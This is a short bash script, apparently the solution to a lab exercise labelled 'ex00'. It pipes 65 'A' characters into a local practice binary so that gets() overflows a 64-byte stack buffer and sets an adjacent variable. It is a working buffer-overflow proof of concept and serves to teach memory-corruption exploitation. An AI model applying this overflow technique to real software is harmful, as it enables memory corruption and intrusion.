#!/usr/bin/env bash
# ex00 — Stack buffer overflow into adjacent local variable
# gets() has no length limit; writing 65 bytes overflows the 64-byte buffer
# and sets the adjacent `modified` variable to a non-zero value.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex00 — overflow modified via gets()"
echo ""

python3 -c "print('A'*65)" | "$BIN"

echo ""
echo "[*] done."
